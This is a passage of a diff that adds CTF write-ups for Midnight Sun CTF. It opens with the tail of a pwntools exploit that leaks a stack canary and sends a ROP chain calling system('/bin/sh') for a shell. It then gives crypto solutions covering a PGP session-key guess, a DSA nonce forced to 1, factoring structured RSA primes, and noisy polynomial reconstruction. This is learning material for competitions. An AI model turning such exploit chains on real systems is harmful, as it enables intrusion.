+) <span class="hljs-comment"># leak parent canary then get shell</span>
+print <span class="hljs-built_in">len</span>(thirdpay)
+
+
+
+fivepay=<span class="hljs-string">"\x00\x01"</span>
+
+r.<span class="hljs-built_in">send</span>(thirdpay)
+r.<span class="hljs-built_in">send</span>(fourpay)
+<span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">1</span>)
+r.<span class="hljs-built_in">send</span>(fivepay)
+
+jj=r.recv()
+canary=jj[<span class="hljs-number">0x48</span>:<span class="hljs-number">0x48</span>+<span class="hljs-number">8</span>]
+returnadd=jj[<span class="hljs-number">0x78</span>:<span class="hljs-number">0x78</span>+<span class="hljs-number">8</span>]
+
+print hex(u64(canary))
+print hex(u64(returnadd))
+
+finalpay=(<span class="hljs-string">"/bin/sh\x00"</span>+<span class="hljs-string">"\x00"</span>*<span class="hljs-number">0x40</span>
++canary+<span class="hljs-string">"a"</span>*<span class="hljs-number">0x28</span>
++p64(<span class="hljs-keyword">text</span>+poprdi)
++p64(shared+<span class="hljs-number">2</span>)
++p64(<span class="hljs-keyword">text</span>+<span class="hljs-keyword">system</span>)
+) <span class="hljs-comment"># The payload for getting shell</span>
+
+print <span class="hljs-built_in">len</span>(finalpay)
+r.<span class="hljs-built_in">send</span>(<span class="hljs-string">"\x90\x00"</span>+finalpay)
+
+r.interactive() <span class="hljs-comment">#midnight{7h3re5_n0_I_iN_VM_bu7_iF_th3r3_w@s_1t_w0uld_b3_VIM}</span>
+</code></pre><h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="pgp-com"><a class="header-link" href="#pgp-com"></a>Pgp-com</h3>
+<p>First, extract private key, public keys, and three PGP messages from <code>pgp-communication.txt</code>. Try to decrypt the three PGP messages (passphrase: <code>changemeNOW</code>):</p>
+<pre class="hljs"><code>gpg --import private<span class="hljs-selector-class">.txt</span>
+gpg --import public<span class="hljs-selector-class">.txt</span>
+gpg --output dec1<span class="hljs-selector-class">.txt</span> --decrypt msg1<span class="hljs-selector-class">.gpg</span>
+gpg --output dec2<span class="hljs-selector-class">.txt</span> --decrypt msg2<span class="hljs-selector-class">.gpg</span>
+gpg --output dec3<span class="hljs-selector-class">.txt</span> --decrypt msg3<span class="hljs-selector-class">.gpg</span>
+</code></pre><p>An error occurs when decrypting <code>msg2.gpg</code>. However, we get a hint from <code>dec3.txt</code>:</p>
+<pre class="hljs"><code>We have received <span class="hljs-keyword">some</span> indications <span class="hljs-keyword">that</span> our PGP implementation has problems <span class="hljs-keyword">with</span> randomness.
+</code></pre><p>Observe the session keys used in <code>msg1.gpg</code> and <code>msg3.gpg</code></p>
+<pre class="hljs"><code>gpg --<span class="hljs-keyword">show</span>-session-<span class="hljs-built_in">key</span> -d msg1.gpg
+gpg --<span class="hljs-keyword">show</span>-session-<span class="hljs-built_in">key</span> -d msg3.gpg
+</code></pre><p>which are</p>
+<pre class="hljs"><code>gpg: session <span class="hljs-keyword">key</span>: `<span class="hljs-number">9</span>:<span class="hljs-number">0000000000000000000000000000000000000000000000000000000000001336</span><span class="hljs-comment">'</span>
+gpg: session <span class="hljs-keyword">key</span>: `<span class="hljs-number">9</span>:<span class="hljs-number">0000000000000000000000000000000000000000000000000000000000001338</span><span class="hljs-comment">'</span>
+</code></pre><p>And we can guess the session key used in <code>msg2.gpg</code>:</p>
+<pre class="hljs"><code><span class="hljs-selector-tag">gpg</span> <span class="hljs-selector-tag">--override-session-key</span> 9<span class="hljs-selector-pseudo">:0000000000000000000000000000000000000000000000000000000000001337</span> <span class="hljs-selector-tag">-d</span> <span class="hljs-selector-tag">msg2</span><span class="hljs-selector-class">.gpg</span>
+</code></pre><p>Flag: <code>midnight{sequential_session_is_bad_session}</code></p>
+<h3 id="ezdsa"><a class="header-link" href="#ezdsa"></a>EZDSA</h3>
+<p>k is generated from a urandom number <code>u</code> and our message <code>m</code> with:</p>
+<pre class="hljs"><code>k = pow(<span class="hljs-keyword">self.gen, </span>u * <span class="hljs-keyword">bytes_to_long(m), </span><span class="hljs-keyword">self.q)
+</span></code></pre><p>If m is the multiplicative order of <code>Z*/qZ*</code>, k will be one.
+However, there&#39;s a assertion prevents us to send such <code>m</code>:</p>
+<pre class="hljs"><code>assert(<span class="hljs-name">bytes_to_long</span>(<span class="hljs-name">m</span>) % (<span class="hljs-name">self</span>.q - <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>)
+</code></pre><p>Instead, we can let k be an element in a small subgroup of <code>Z*/qZ*</code>, so we can try all possible <code>k</code>.
+Possible sizes of subgroup is the factor of the order:</p>
+<pre class="hljs"><code><span class="hljs-symbol">2 </span>* <span class="hljs-number">3</span> * <span class="hljs-number">11</span> * <span class="hljs-number">53</span> * <span class="hljs-number">10044829213</span> * <span class="hljs-number">232139128489</span> * <span class="hljs-number">102485294776585522175741</span>
+</code></pre><p>The smallest one is <code>{1, -1}</code>, if we send <code>(q - 1) // 2</code> as <code>m</code>, <code>k</code> will always be 1 or -1.
+Moreover, <code>self.gen</code> is not a generator of <code>Z*/qZ*</code>, <code>k</code> will always be 1.</p>
+<p>Given a signature with <code>k = 1</code>, the key (i.e. flag) is <code>(s - hash) / r</code>.</p>
+<h3 id="open-gyckel-krypto"><a class="header-link" href="#open-gyckel-krypto"></a>Open-gyckel-krypto</h3>
+<pre class="hljs"><code>Let
+    p = <span class="hljs-keyword">a</span> * <span class="hljs-number">10</span>^<span class="hljs-number">250</span> + b
+    q = b * <span class="hljs-number">10</span>^<span class="hljs-number">250</span> + <span class="hljs-keyword">a</span>
+    where <span class="hljs-keyword">a</span>, b &lt; <span class="hljs-number">10</span>^<span class="hljs-number">250</span>
+
+So:
+    pq = <span class="hljs-keyword">a</span> * b * <span class="hljs-number">10</span>^<span class="hljs-number">500</span> + (<span class="hljs-keyword">a</span>^<span class="hljs-number">2</span> + b^<span class="hljs-number">2</span>) * <span class="hljs-number">10</span>^<span class="hljs-number">250</span> + <span class="hljs-keyword">a</span> * b
+
+Let
+    x = <span class="hljs-keyword">a</span> * b % <span class="hljs-number">10</span>^<span class="hljs-number">250</span>
+    y = <span class="hljs-keyword">a</span> * b<span class="hljs-comment"> // 10^250</span>
+
+We can rewrite pq <span class="hljs-keyword">as</span>:
+    pq = y * <span class="hljs-number">10</span>^<span class="hljs-number">750</span> + x * <span class="hljs-number">10</span>^<span class="hljs-number">500</span> + (<span class="hljs-keyword">a</span>^<span class="hljs-number">2</span> + b^<span class="hljs-number">2</span>) * <span class="hljs-number">10</span>^<span class="hljs-number">250</span> + y * <span class="hljs-number">10</span>^<span class="hljs-number">250</span> + x
+
+Implies
+pq % <span class="hljs-number">10</span>^<span class="hljs-number">250</span> = x
+pq<span class="hljs-comment"> // 10^750 will in range [y, y+6]</span>
+
+Given <span class="hljs-keyword">a</span> possible `y`, we can calculate (<span class="hljs-keyword">a</span>^<span class="hljs-number">2</span> + b^<span class="hljs-number">2</span>) <span class="hljs-keyword">and</span> <span class="hljs-keyword">a</span> * b <span class="hljs-built_in">to</span> solve <span class="hljs-keyword">a</span> <span class="hljs-keyword">and</span> b.
+</code></pre><h3 id="tulpan257"><a class="header-link" href="#tulpan257"></a>Tulpan257</h3>
+<p>We have 107 evaluation results of a degree 26 polynomial.
+Some of them are wrong, and the probability of a result to be wrong is 0.4.
+If we random select 26 result, the probability of all selected result is correct is about 2e-6, which is very high.
+We can keep selecting different results, and reconstruct the polynomial.</p>
+<p>To check whether we get the correct polynomial,
+just calculate those 107 evaluation results and check whether the error probability is close to 0.4.</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
